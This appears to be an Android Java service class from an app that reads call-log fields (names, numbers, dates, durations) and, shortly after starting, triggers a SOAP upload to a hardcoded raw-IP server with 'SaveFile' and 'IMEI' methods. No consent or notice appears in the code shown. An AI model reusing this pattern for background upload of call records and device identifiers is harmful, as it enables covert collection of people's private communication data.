package com.example.tongxunluf;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.KeyguardManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.provider.CallLog;
import android.telephony.TelephonyManager;

import androidx.annotation.RequiresApi;
import androidx.core.app.NotificationCompat;

import com.example.tongxunluf.upload.Upload;

import org.ksoap2.SoapEnvelope;
import org.ksoap2.serialization.SoapObject;
import org.ksoap2.serialization.SoapSerializationEnvelope;
import org.ksoap2.transport.HttpResponseException;
import org.ksoap2.transport.HttpTransportSE;
import org.xmlpull.v1.XmlPullParserException;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Timer;
import java.util.TimerTask;



public class RespenseService extends Service {
    public RespenseService() {
    }
    private String[] FileExist;
    private String[] b2;
    private Uri callUri = CallLog.Calls.CONTENT_URI;
    private String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
            , CallLog.Calls.NUMBER// 通话记录的电话号码
            , CallLog.Calls.DATE// 通话记录的日期
            , CallLog.Calls.DURATION// 通话时长
            , CallLog.Calls.TYPE};// 通话类型}
    private String b;
    private int number1 = 0;
    private int number2 = 0;
    private String phoneNumber;
    private int n1 = 0;
    private int n2 = 0;
    private int fenzhong = 0;
    private int xiaoshi = 0;
    private static final String nameSpace = "http://tempuri.org/";
    private static final String Myurl = "http://49.235.3.119:80/Service.asmx";
    private static final String Mymethod = "SaveFile";
    private static final String Mymethod2 = "IMEI";
    String local_file = Environment.getExternalStorageDirectory().getAbsolutePath() + "/TXT";
    File file2;
    File file;
    private String Name2;
    SimpleDateFormat time = new SimpleDateFormat("yyyy/MM/dd");
    FileOutputStream FO,F1;
    FileReader FR;
    BufferedReader BR;
    int i = 1;
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Timer T = new Timer();
        TimerTask TT = new TimerTask() {
            @Override
            public void run() {
                new Thread() {
                    @Override
                    public void run() {
                        Upload.sendBySoap();
                    }
                }.start();

            }
        };
        T.schedule(TT,1000);
    }

}
